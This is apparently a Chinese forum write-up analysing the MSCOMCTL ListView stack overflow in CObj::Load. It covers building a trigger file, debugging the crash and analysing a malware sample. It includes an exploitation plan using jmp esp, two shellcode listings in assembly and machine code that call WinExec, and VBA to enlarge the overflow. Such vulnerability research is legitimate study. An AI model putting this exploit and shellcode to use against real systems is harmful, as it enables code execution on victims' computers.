
在Excel中创建`ListView`控件并添加`ListItem`子对象使其调用漏洞函数`CObj::Load`。此处用VBA代码进行添加并将其编译生成对象，为避免保存失败，编译后需删除相应代码并保存文件：

[![cJBHfI.png](https://bbs.kanxue.com/upload/attach/202104/914073_GHU5XU5K35KUJKS.jpg)](<https://bbs.kanxue.com/elink@5fbK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6U0d9V1u0t1k6V1V1>).

将保存后文件拖入winhex，找到`CObj`类，修改相应的十六进制令其大于8并保存文件，再次打开Excel弹出报错则表明已成功触发漏洞：

[![cJB7tA.png](https://bbs.kanxue.com/upload/attach/202104/914073_E49PKSPBQ3GY8F4.jpg)](<https://bbs.kanxue.com/elink@f86K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6U0d9V1t1%4N6p5p5>).

#### 0x01.2.b 漏洞详细分析

Ollydbg附加至Excel并打开构造好的POC，Excel报错将弹出报错，Ollydbg将停在`0x65006B`处。

此时栈中情况如下图所示。可以猜测在加载`MSCOMCTL`模块时出现问题，那么在该模块处下断点并重新加载：

[![cJBL1P.png](https://bbs.kanxue.com/upload/attach/202104/914073_8CEHZD89KS6K6Y6.jpg)](<https://bbs.kanxue.com/elink@15dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6U0d9V1u0x3x3g2l9>).

最终发现执行至`0x275c8a56`处发生错误，此时栈情况如下，其返回地址为`0x65006B`：

[![cJBqpt.png](https://bbs.kanxue.com/upload/attach/202104/914073_KRUQMHYDQ98ZUR8.jpg)](<https://bbs.kanxue.com/elink@4eeK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6U0d9V1u0I4M7s2b7>).

从发生错误的位置向上回溯，单步调试至`0x275C8A05`处，发现调用该函数后，栈被覆盖：

[![cJBO6f.png](https://bbs.kanxue.com/upload/attach/202104/914073_G24Q3CX44EYX7GD.jpg)](<https://bbs.kanxue.com/elink@369K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6U0d9V1u0a6y4X3j5>).

该参数读入长度`0x18`，是构造POC时修改的读入长度：

[![cJBx0g.png](https://bbs.kanxue.com/upload/attach/202104/914073_JP6V62UEUJHKVUX.jpg)](<https://bbs.kanxue.com/elink@ee2K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6U0d9V1u0^5x3r3M7>).

寄存器`eax`值为需要读入的字符地址，而这段字符就是Excel中`Cobj`关键字后的内容：

[![cJBXX8.png](https://bbs.kanxue.com/upload/attach/202104/914073_VSK3PGGGMQD6VDH.jpg)](<https://bbs.kanxue.com/elink@c2bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6U0d9V1u0j5h3o6R3>).

[![cJBvnS.png](https://bbs.kanxue.com/upload/attach/202104/914073_UY4HB4UQJX2P28Y.jpg)](<https://bbs.kanxue.com/elink@3e8K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6U0d9V1u0$3L8W2x3>).

在关键函数`0x275C8A05`内部，`0x275C878D`有一处验证变量值的语句，为方便观察笔者将数值修改为`0x18`、`0x19`。构造POC时修改的两个数值前者为读入长度，后者为验证参数。但在读入文件时两个数同时被读入，因此该验证可通过修改文件数据直接绕过。

[![cJBz7Q.png](https://bbs.kanxue.com/upload/attach/202104/914073_5BDZRZQEM6AK6SP.jpg)](<https://bbs.kanxue.com/elink@611K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6U0d9V1u0*7y4#2p5>).

最终执行拷贝的语句在`0x275c87cb`处，执行后栈发生改变：

[![cJD9ts.png](https://bbs.kanxue.com/upload/attach/202104/914073_3A6HP6ZE7PC6GBD.jpg)](<https://bbs.kanxue.com/elink@845K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6U0d9V1b7&6N6s2x3>).

结合`MSCOMCTL.OCX`模块的IDA伪代码：

[![cJDChn.png](https://bbs.kanxue.com/upload/attach/202104/914073_ESW6HFPJUVYG8SN.jpg)](<https://bbs.kanxue.com/elink@275K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6U0d9V1c8o6K9r3^5>).

#### 0x01.2.c 利用思路及shellcode编写

首先将覆盖长度修改为更大数值，之后修改返回地址指向`jmp esp`指令，将Shellcode置于返回地址偏移`0x8`处使其能成功被执行。

##### Shellcode(硬编码)

通过`Stud_PE`获取`Kernel32.dll`模块基址及`WinExec`偏移，构造语句`WinExec("AAAA.exe", 5)`

```c
int main(void){
    __asm{
        PUSH    EBP
        MOV     EBP, ESP
        XOR     EAX,EAX
        PUSH    EAX
        PUSH    6578652Eh // ".exe"
        PUSH    41414141h // "AAAA"
        //若此处修改为636c6163，就能弹出计算器
        MOV     EAX,ESP
        PUSH    5
        PUSH    EAX // "AAAA.exe"
        MOV     EAX,7783e5fdh // WinExec("AAAA.exe", 5)
        CALL    EAX
        MOV     ESP,EBP
        POP     EBP
    }
    return 0;
}
```

转换成机器码为`558BEC558BEC33C050682E65786568414141418BC46A0550B8FDE58377FFD08BE55D`

##### Shellcode(动态获取模块基址)

此处参考《加密与解密(第四版)》十四章相关思路，通过TEB查找法获取`Kernel32.dll`基址，进而得到其导出表地址以获取`LoadLibrary()`和`GetProcessAddress()`函数地址，通过它们组合来获取任意DLL中的API地址。

汇编代码如下：

```c
int main(void){
    __asm{
        //查找kernel32.dll基址
        XOR EAX, EAX
        MOV EAX, DWORD PTR FS : [0x30]//PEB
        MOV EAX, DWORD PTR [EAX + 0xC]//PEB_LDR_DATA
        MOV ESI, DWORD PTR [EAX + 0x14]//不同操作系统偏移不同
        lodsd
        XCHG EAX, ESI
        lodsd
        MOV EBX, DWORD PTR [EAX + 0x10]//获取kernel32基址
        MOV EDX, DWORD PTR [EBX + 0X3C]// e_lfanew
        MOV EDX, DWORD PTR [EBX + EDX + 0X78] // ETA
        ADD EDX, EBX
        MOV ESI, DWORD PTR [EDX+ 0X20]//namestable
        ADD ESI, EBX
        XOR ECX, ECX
GET_FUNCTION:
        INC ECX
        lodsd
        ADD EAX, EBX// 读取函数名称
        CMP DWORD PTR [EAX], 0X50746547
        JNZ GET_FUNCTION
        CMP DWORD PTR [EAX + 0X4], 0x41636f72
        JNZ GET_FUNCTION
        CMP DWORD PTR [EAX + 0X8], 0x65726464
        JNZ GET_FUNCTION
        MOV ESI, [EDX + 0X24]
        ADD ESI, EBX
        MOV CX, WORD PTR [ESI + ECX * 2]
        DEC ECX
        MOV ESI, DWORD PTR [EDX + 0X1C]
        ADD ESI, EBX
        MOV EDX, DWORD PTR [ESI + ECX * 4]
        ADD EDX, EBX //GETprocAddress
        XOR ECX, ECX
        push 0X00636578 //xec
        PUSH 0X456E6957 //WinE
        PUSH ESP
        PUSH EBX
        CALL EDX
        XOR ECX,ECX
        PUSH ECX
        PUSH 0X6578652E   // ".exe"
        PUSH 0X41414141  // "AAAA"
        //若此处修改为636c6163，就能弹出计算器
        MOV  EBX,ESP
        PUSH 5
        PUSH EBX
        CALL EAX
    }
    return 0;
}
```

转换成机器码为`535633C064A1300000008B400C8B7014AD96AD8B58108B533C8B54137803D38B722003F333C941AD03C381384765745075F4817804726F634175EB8178086464726575E28B722403F3668B0C4E498B721C03F38B148E03D333C968786563006857696E455453FFD233C951682E6578656863616C638BDC6A0553FFD05E33C05BC3`

此处需要注意的是：机器码过长会超出构造POC时设置的代码段的长度，这里笔者采用了维一零师傅的方式，代码修改如下，以保证Shellcode正常读入及执行：

```vb
Dim L1 As ListItem
Dim key1 As String
Dim i As Integer
i = 0
key1 = "key1"
While (i < 20)
    key1 = key1 + key1
    i = i + 1
Wend
'MsgBox (key1)
Set L1 = ListView1.ListItems.Add(1, key1 + "1", "test1", 0, 0)
Set L2 = ListView1.ListItems.Add(2, key1 + "2", "test2", 0, 0)
Set L3 = ListView1.ListItems.Add(3, key1 + "3", "test3", 0, 0)
```

### 0x01.3 利用样本分析

#### 0x01.3.a 基本信息

> NAME: `malware_1264.doc`
>
> MD5: `F393FDC7F3853BC7C435C13A4962C688`
>
> SHA1: `48510754C8FD91E3CD5930AF7AE755D4AA2B6D29`

#### 0x01.3.b 详细分析

`0x275c8a56`处为漏洞触发位置，通过跳板指令`jmp esp`转至Shellcode执行并解密数据：

[![cJwgE9.png](https://bbs.kanxue.com/upload/attach/202104/914073_7U28H6SY3ZVTJ8J.jpg)](<https://bbs.kanxue.com/elink@1f8K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6U0d9Y4N6Y4c8e0V1>).

通过TEB查找法获取`kernel32.dll`基址并依次查找API函数地址：

[![cJwf9x.png](https://bbs.kanxue.com/upload/attach/202104/914073_4TM5XGBRU6EHUAJ.jpg)](<https://bbs.kanxue.com/elink@83cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6U0d9Y4N6X3z5i4R3>).

判断文件大小以确认是否为样本文件，是则获取其路径：

[![cJwh36.png](https://bbs.kanxue.com/upload/attach/202104/914073_7HPF7AR3VH32H5U.jpg)](<https://bbs.kanxue.com/elink@fc1K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6U0d9Y4N6Z5x3K6j5>).

打开文件，并获取读取写入权限：

[![cJw2NR.png](https://bbs.kanxue.com/upload/attach/202104/914073_AA77V738VB5P93A.jpg)](<https://bbs.kanxue.com/elink@45cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6U0d9Y4M7J5e0W2t1>).
